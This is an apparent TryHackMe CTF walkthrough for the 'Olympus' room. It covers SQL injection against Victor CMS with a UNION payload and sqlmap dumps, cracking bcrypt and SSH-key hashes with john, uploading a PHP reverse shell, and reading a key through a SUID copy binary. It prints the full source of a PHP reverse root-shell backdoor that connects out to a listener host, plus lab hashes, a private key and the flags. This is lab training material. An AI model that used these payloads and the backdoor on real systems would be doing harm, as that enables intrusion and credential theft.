---
title: "Olympus - TryHackMe Writeup & Walkthrough"
description: "Solving the Olympus room on TryHackMe using SQL injection, cracking hashes, and finding hidden endpoints."
permalink: /TryHackMe/MEDIUM/Olympus/
---

# Olympus Writeup

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Medium-orange)](https://tryhackme.com/room/olympusroom)
[![Category](https://img.shields.io/badge/Category-Web%20Exploitation-brightgreen)](#)

> Room Link → [Olympus](https://tryhackme.com/room/olympusroom)

## Task 1: Connection

Hey!

Start the machine and start enumerating! The machine can take some time to start. **Please allow up to 5 minutes** (Sorry for the inconvenience). **`Bruteforcing` against any login page is out of scope and should not be used**.

If you get stuck, you can find hints that will guide you on my GitHub repository (you'll find it in the walkthrough section).

Well... Happy hacking ^^ 

Petit Prince

## Table of Contents

- [Introduction](#introduction)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Flags](#flags)
- [Privilege Escalation](#privilege-escalation)

---

## Task 2: Flag submission

---

## Enumeration

Let's start enumerating the machine.

```bash
rustscan -a 10.49.154.120 -- -sCV -oN rust
```

The result:

```bash
# Nmap 7.99 scan initiated Thu Apr 23 08:42:51 2026 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -4 -sCV -oN rust 10.49.154.120
Nmap scan report for 10.49.154.120
Host is up, received reset ttl 62 (0.10s latency).
Scanned at 2026-04-23 08:42:52 EDT for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea:cc:92:97:be:05:70:48:68:ad:86:b2:b1:27:9b:f2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoMXNeUI5mvarDznkyLRXSTmEGt6MmV4tRDWoLssaSJV01Nz4M/FKMV21gJ/HTVuGAKk8DTEYmVvioxX5ZXCPidv/vvnmQT4dLk2z9GsEcqHvr97T7pcHOy8DGd8E2DRnaBaxPLial5P8SzLbqsjWg4ZE8NwttrlISUIPX6/qVzNbZyaoQlj1yR5xjPQ+VFJ4jd2JYFyvHkW5+a5yjg0wl3XeOJZaPbqRU2DVKVGJY8jZ6VGNVIzy/sr3gDr9a44eQotcvnszjIAneBnHCWeYN/ydSjndoQDMWgV1EtIaKm7nVe4IvhH6dgRzAoBqLGRDKX1rXwVYaYxgKtkvIkdCx11DQ6oEAEZ8tysHR1OBj9HW+rLlNWThTIXkFRxZDXL1QURgWlLoOMSR5WrJkPuZVIxjUPFOd2B5Lv6p6XRNibF/OKE2UVb0Yriv/GQ7HaoG/M9wOW7JEpNPegTiH3Qnnl2s0xcM7kfdarohiAHpesjWQOAqQWKh3hdWgLY+vJy8=
|   256 13:31:c4:e5:74:17:5f:ec:e8:9d:d0:9d:8d:b5:46:56 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDRwVQWzQMXouMaQNwc5WQd+5T1B7ikPExu+D7PdIAS8L/yyUX7AaYvFE6AQTyCN3WfWa5uvp19zFm85ShyBfSg=
|   256 96:97:ef:a8:f7:a5:b3:41:ee:f6:2d:76:b2:a6:ca:43 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpUzcpXHMfeg8p58BncoELed90iNmglCEDMl4gUUDx0
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://olympus.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 23 08:43:02 2026 -- 1 IP address (1 host up) scanned in 11.10 seconds

```

From above result we can see there are only two open ports `22 (ssh)` and `80 (http)`
So let's go down the route of `http`

First we should add the machine IP to our `/etc/hosts` for connecting to server.

```plain
10.49.154.120	olympus.thm
```

now let us see what is there on `http://olympus.thm`

So, here we are treated with the given page

![](attachment/d6d893489354203a75cfc50b077e4cca.png)

> [!HINT]
> The old version of the website is still accessible on this domain

Thus, let's try to enumerate further and see where we can access the old version -- hope it will be helpful to us...

Let's start with `gobuster` to find something interesting...

```bash
 gobuster dir -u http://olympus.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 80 -x .php, .js, .html | tee -a dir_scan
```

```go
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php             (Status: 403) [Size: 276]
.htaccess.           (Status: 403) [Size: 276]
.htpasswd.           (Status: 403) [Size: 276]
.htaccess.php        (Status: 403) [Size: 276]
.htpasswd.php        (Status: 403) [Size: 276]
.hta.                (Status: 403) [Size: 276]
.htaccess            (Status: 403) [Size: 276]
.hta                 (Status: 403) [Size: 276]
.htpasswd            (Status: 403) [Size: 276]
index.php            (Status: 200) [Size: 1948]
index.php            (Status: 200) [Size: 1948]
javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
phpmyadmin           (Status: 403) [Size: 276]
server-status        (Status: 403) [Size: 276]
static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
===============================================================
Finished
===============================================================
```

We go to `~webmaster`, It's Victor's CMS

![](attachment/72b9879e76365eede3f7cbba887340c3.png)

As I was inspecting the page source I found these lines

```html
<p>
  <strong
    >Dear Gods and Godess, I found out that some of you (not everyone
    thankfully) use really common passwords.</strong
  >
</p>
<p>
  <strong
    >As I remind you, we have a wordlist of forbidden password that you should
    use.
  </strong>
</p>
<p><strong>Please update your passwords.</strong></p>
<p>&nbsp;.........</p>
<a href="post.php?post=3">
  <button type="button" class="btn btn-primary">
    Read More<span class="glyphicon glyphicon-chevron-right"></span>
  </button>
</a>
<hr />
<!-- Post Area -->
<!-- Post Area-->
```

Maybe in future we will need a wordlist the one user is talking about here.

---

## Exploitation

We know that the old version of the site is using `Victor's CMS` so let's try to find if we get any exploits for it...

```bash
└─$ searchsploit "Victor CMS"
---
 Exploit Title                                                              |  Path
---
Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                 | php/webapps/48511.txt
Victor CMS 1.0 - 'cat_id' SQL Injection                                     | php/webapps/48485.txt
Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting           | php/webapps/48484.txt
Victor CMS 1.0 - 'post' SQL Injection                                       | php/webapps/48451.txt
Victor CMS 1.0 - 'Search' SQL Injection                                     | php/webapps/48734.txt
Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting           | php/webapps/48626.txt
Victor CMS 1.0 - Authenticated Arbitrary File Upload                        | php/webapps/48490.txt
Victor CMS 1.0 - File Upload To RCE                                         | php/webapps/49310.txt
Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                     | php/webapps/49282.txt
---
```

YUPP JACKPOT!!

Looks like `Vicotr's CMS` is vulnerable to SQL injection
for now let's try to use `cat_id` which says:

```plain
# Exploit Title: Victor CMS 1.0 - 'cat_id' SQL Injection
# Google Dork: N/A
# Date: 2020-05-19
# Exploit Author: Kishan Lal Choudhary
# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
# Version: 1.0
# Tested on: Windows 10

Description: The GET parameter 'category.php?cat_id=' is vulnerable to SQL Injection


Payload: UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--


http://localhost/category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--

By exploiting the SQL Injection vulnerability by using the mentioned payload, an attacker will be able to retrieve the database name and version of mysql running on the server.
```

We can see below the database name and version are shown with the help of `?cat_id`

- MySQL version: 8.0.28-0ubuntu0.20.04.3
- Database name: `olympus`
  ![](attachment/20cc84686cb7f1cadef5b323c17fc344.png)

## Flags

Now we can automate our process of getting flag from database using `sqlmap` for info -- [Check this exploit on exploitdb](https://www.exploit-db.com/exploits/48734#:~:text=sqlmap%20%2Du%20%22http%3A%2F%2Fexample%2Ecom%2FCMSsite%2Fsearch%2Ephp%22%20%2D%2Ddata%3D%22search%3D1337%2A%26submit%3D%22%20%2D%2Ddbs%20%2D%2Drandom%2Dagent%20%2Dv%203)

By using the following command

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
```

We got this result

```plain
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys
```

So I checked the tables in the database `olympus`

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --tables
```

```plain
Database: olympus
[6 tables]
+------------------------------------------------------+
| categories                                           |
| chats                                                |
| comments                                             |
| flag                                                 |
| posts                                                |
| users                                                |
+------------------------------------------------------+
```

Here we can see a table named `flag` let's dump it all
I used this command to dump the `flag` table:

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3  -D olympus -T flag --dump
```

Result:

```plain
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{Sm4rt!_k33P_d1gGIng} |
+---------------------------+
```

Hence,

> Flag 1 --> `flag{Sm4rt!_k33P_d1gGIng}`

In DB `olympus` there is also this table named `users` let's check it..
We got three entries in here

```plain
Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```

```bash
└─$ haiti '$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK'
bcrypt [HC: 3200] [JtR: bcrypt]
Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]
Woltlab Burning Board 4.x
```

Given hashes are `bcrypt` hash-type can we brute force it ? Let's try it out ..

Save all three hashes in a file > `hashes`

```hash
$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
```

We got result for the first hash which was of user `prometheus`

```bash
└─$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summertime       (?)
```

Let's dive in as `prometheus`

![](attachment/2863fd037b5a4583c10160a3e98ff6cb.png)

We're now logged in as user `prometheus`
![](attachment/b338d783276fc094301dc75a938b8724.png)

In `Users` section we can see all three users but see the domains of the emails for root and `zeus`

![](attachment/d21f609abaff6f8939530f42c21a5d53.png)

> We found these in our DB dump also but I didn't think anything of it (😅)

`Ahhh`. So now let's add this domain in our SPECIAL file `/etc/hosts` and dive in it...

We are again hit by a login page
![](attachment/bc682475511c319115eb52c94da350ca.png)

But we have `prometheus` creds !! Let's try those..
AAANDDDDDDD WE GOT INNNNNN...................

![](attachment/f82514f79aa01d7ce53d71313836035b.png)

We've got a file upload so it's time to try to get a **_reverse shell_** with our beloved [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) script.

The file will most likely be stored in `/uploads` as the two are discussing in the image but for my satisfaction I ran `gobuster` on the site and got the same result

```plain
static               (Status: 301) [Size: 321] [--> http://chat.olympus.thm/static/]
upload.php           (Status: 200) [Size: 112]
uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/]
```

But that is no use for us as the name of the file is changed and thus we cannot directly call our file and get the shell so first of all we need to find what `random` name did the system gave to our file.

For that I guess we can make use of the DB as the files will be stored there and we can get the randomized name from there!

Let's try with `DB: olympus` & `Table: chats`

![](attachment/b11b59603dbe7b5ab21d55eb9c0df4a4.png)

```bash
Database: olympus
Table: chats
[5 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| dt         | msg                                                                                                                                                             | uname      | file                                 |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                              |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                              |
| 2026-04-23 | Let's try this one\r\n                                                                                                                                          | prometheus | <blank>                              |
| 2026-04-23 | Attached : rev-shell.php                                                                                                                                        | prometheus | 8d9628edbc5c4dc519a7428f0d300dd6.php |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+

```

Thus our filename was change to
`rev-shell.php` --> `8d9628edbc5c4dc519a7428f0d300dd6.php`

WOOOOOOOOO WE GOT INNNN >>>>>>

![](attachment/01a3f3666fb1e64c07a70660949bdcdb.png)
After getting in first thing to do is make the shell interactive so that it sticks with us...

We got another flag >

```bash
www-data@ip-10-49-154-120:/home/zeus$ cat user.flag
flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
```

> Flag 2: `flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}`

There's also this text file in `zeus` home

```text
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.



                                                - Prometheus.

```

## Privilege Escalation

Now, we should first check with SUID executables so that we can run it as `zeus` for our own :)...

And we found this one

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

Which the user `zeus` can execute.

```bash
-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
```

After running, it asked for a source file and a target file so I tried giving the path of `private` `id_rsa` file which stays inside `/home/user/.ssh` folder

![](attachment/CPUtilsImage.png)

> [!TIP]
> I accidentally pressed backspace while writing the output filename and thus it got `i^H` so ignore it.

We got the private key for `ssh`, meaning we can now log in as user `zeus`

```go
-----BEGIN OPENSSH PRIVATE KEY-----
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
eRZjPBIy1rjIUiWe6LS1ToEyqfY=
-----END OPENSSH PRIVATE KEY-----
```

- Save the private key as `id_rsa` in our system
- change its permissions to `400`
  - `chmod 400 id_rsa`
- Log in using the private key

AHH WHY IS IT ALWAYS `PLEASE ENTER YOUR PASSWORD` & why not `YEAH GO IN` ---- until its our creds ⚠️

![](attachment/f94c4fe54b6d625c71d953ee67b8acab.png)

We'll make use of `john` here to get the passphrase
WEEWOO We got it

```bash
┌──(undead-ghost㉿kali)-[~/Documents/THM/THM_CTFs/olympusroom]
└─$ ssh2john id_rsa > zeus_id_rsa_pass_hash

┌──(undead-ghost㉿kali)-[~/Documents/THM/THM_CTFs/olympusroom]
└─$ john zeus_id_rsa_pass_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snowflake        (id_rsa)
1g 0:00:00:47 DONE (2026-04-23 10:30) 0.02107g/s 31.68p/s 31.68c/s 31.68C/s maurice..bunny
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> `snowflake`

```bash
ssh -i id_rsa zeus@10.49.154.120
```

And we're again in -------------------------------------------- (`how many times ;(` )

![](attachment/c9dc38abb73618a208dca3d13008ae61.png)

When we go into `/var/www/html/` directory we can see a directory with random/garbage name which consists of

```bash
zeus@ip-10-49-154-120:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -lah
total 12K
drwxrwx--x 2 root     zeus     4.0K Jul 15  2022 .
drwxr-xr-x 3 www-data www-data 4.0K May  1  2022 ..
-rwxr-xr-x 1 root     zeus        0 Apr 14  2022 index.html
-rwxr-xr-x 1 root     zeus     1.6K Jul 15  2022 VIGQFQFMYOST.php
```

and `VIGQFQFMYOST.php` consist this script

```php
{% raw %}
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
{% endraw %}
```

We've got a pass variable

> `$pass = "a7c5ffcf139742f52a5267c4a0674129";`

and

> ```
> snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]
> ```

Let's try to go to this reverse root shell and capture the reverse shell with path `0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php`

![](attachment/8a4bbddd30ac1c3e3492a0a7e5c03913.png)

Enter the `$pass` in the password field and we get to the endpoint

![](attachment/4bf020e355e33c6eb15fc567daa1ecfc.png)

We can see we have a remote connection link through which we can connect to the root shell backdoor
So let's try connecting to it.

WE ARE FINALLY LOGGED IN AS ROOT ...

<div style="width:360px;max-width:100%;"><div style="height:0;padding-bottom:55.83%;position:relative;"><iframe width="420" height="250" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameBorder="0" src="https://imgflip.com/embed/apyoai"></iframe></div></div>

![](attachment/2e0a71e761030df009cb002a7387e4ce.png)

`root.flag`

```plain
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./




                You did it, you defeated the gods.
                        Hope you had fun !



> **Root Flag**: `flag{D4mN!_Y0u_G0T_m3_:)_}`




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)

```

The final hidden flag -- with the hint on `TryHackMe`

```hint
This is the hint you’re looking for: The flag is located in /etc/
```

We got it using the power of `grep`

```bash
root@ip-10-49-154-120:/etc# grep -r flag .
grep -r flag .
./manpath.config:#DEFINE                whatis_grep_flags               -i
./manpath.config:#DEFINE                apropos_grep_flags              -iEw
./manpath.config:#DEFINE                apropos_regex_grep_flags        -iE
./ssl/private/.b0nus.fl4g:Here is the final flag ! Congrats !
./ssl/private/.b0nus.fl4g:flag{Y0u_G0t_m3_g00d!}
```

> **Bonus Flag**: `flag{Y0u_G0t_m3_g00d!}`

---

YAAYYY IT'S FINALLY DONE

Happy Hacking 🔍😎!!
